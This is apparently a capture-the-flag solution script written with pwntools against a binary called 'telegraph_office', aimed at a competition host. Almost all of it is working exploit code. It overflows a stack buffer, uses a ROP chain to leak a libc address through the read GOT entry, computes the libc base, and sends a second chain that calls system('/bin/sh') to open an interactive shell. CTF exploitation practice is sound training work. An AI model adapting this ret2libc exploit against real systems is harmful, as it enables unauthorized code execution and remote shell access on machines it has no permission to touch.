#!/usr/bin/env python3

from pwn import *

exe = ELF("./telegraph_office_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = exe
context.log_level="debug"
rop=ROP(exe)



def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("offsec.m0lecon.it", 13546)

    return r


def main():

    r = conn()

    OFFSET_TO_RIP = 216
    POP_RDI= 0x4012ce #rop.find_gadgets(["pop rdi","ret"])[0]
    READ_GOT = exe.got["read"]
    MAIN = exe.symbols["main"]
    r.recv()
    r.send(b"A")#-->Trigger the lazy binder
    r.recv()
    # STAGE 0 --> Leak a libc address
    stage0 = flat(
        b'A'*OFFSET_TO_RIP,
        p64(POP_RDI),p64(READ_GOT),
        p64(exe.sym["out"]),
        p64(MAIN),
       
        


    )
    r.send(stage0)
    print(r.recvuntil('Message relayed.\n'))
    leak=r.recvuntil('===')
    leak=u64(leak[:6].ljust(8,b'\x00'),"little")
    print("LEAK=",hex(leak))
    #print(hex(u64(leak.ljust(8,b'\x00'),"little")))
    LIBC_BASE= leak - 0x11ba80
    print(hex(LIBC_BASE))   
    
    BINSH= next(libc.search("/bin/sh\x00")) + LIBC_BASE
    SYSTEM = libc.symbols["system"] + LIBC_BASE
    RET = 0x40101a

    stage2= flat(
            b'A'*OFFSET_TO_RIP,
            p64(POP_RDI),p64(BINSH),
            p64(RET),
            p64(SYSTEM)


    )
    r.send(stage2)

    #r.sendline(b"A")#-->Trigger the lazy binder
  
    #print(hex(u64(r.recv()[222:222+8],"little")))
    r.interactive()


if __name__ == "__main__":
    main()
